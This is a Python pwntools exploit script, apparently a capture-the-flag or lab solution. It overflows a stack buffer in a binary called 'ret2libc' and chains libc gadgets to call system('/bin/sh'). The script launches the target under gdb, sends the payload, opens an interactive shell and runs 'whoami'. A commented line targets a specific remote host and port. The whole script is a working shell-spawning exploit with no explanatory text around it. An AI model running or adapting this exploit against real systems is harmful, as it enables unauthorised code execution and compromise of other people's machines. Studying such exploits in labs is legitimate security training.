#!/usr/bin/env python3
from pwn import *

# for libc_base in range(0x00007ffff7c00000, 0x00007ffffff00001, 0x100000):
libc_base = 0x00007ffff7c00000
if libc_base == 0x00007ffff7c00000:
    print("try libc_base: ", hex(libc_base))
    # Addresses (use the actual addresses found from objdump and ROPgadget)
    system_offset = 0x0000000000050d70  # Offset for the 'system' function in libc
    bin_sh_offset = 0x00000000001d8678  # Offset for '/bin/sh' string in libc
    pop_rdi_ret_offset = 0x000000000002a3e5  # Offset for 'pop rdi; ret' gadget in libc
    puts_addr = 0x401064
    # Offset to the return address (determined using a cyclic pattern)
    offset = 136

    # Calculate the base address of libc based on the vmmap output
    # libc_base = 0x7ffff7c00000  # Base address of libc.so.6 as per the vmmap output

    # Calculate the absolute addresses
    system_addr = libc_base + system_offset
    bin_sh_addr = libc_base + bin_sh_offset
    pop_rdi_ret = libc_base + pop_rdi_ret_offset
    ret_addr    = libc_base + 0x3d79c

    # Craft the payload
    payload = b'A' * offset           # Padding to reach the return address
    payload += p64(ret_addr)          # Alignment 
    payload += p64(pop_rdi_ret)       # Address of 'pop rdi; ret' gadget
    payload += p64(bin_sh_addr)       # Address of "/bin/sh" string
    payload += p64(system_addr)       # Address of system()
    # payload += p64(ret_addr)
    # payload += p64(pop_rdi_ret)
    # payload += p64(bin_sh_addr)
    # payload += p64(puts_addr)
    # Align the stack (16 bytes alignment for movaps instruction)
    payload += p64(0x0)               # Padding for alignment

    # Start the process (update the path to your vulnerable binary)
    # Use gdb to debug and set breakpoints
    r = gdb.debug('./ret2libc', '''
        break main
        continue
    ''')
    # r = process('./ret2libc')
    # r = remote('140.113.24.241', 30173)
    # Send the payload
    r.recvline()
    r.sendline(payload)
    # Interact with the shell
    r.interactive()
    try:
        # test = r.recvline().decode()
        # print("test: ", test)
        # print("test len:", len(test))
        command = str('whoami')
        r.sendline(command)
        result = r.recvline().decode()
        if len(result) > 0:
            print("result: ", result)
            r.close()
            # break
        # Process response
    except (EOFError, BrokenPipeError) as e:
        print(f"Error: {e}")
    finally:
        r.close()

    sleep(0.1)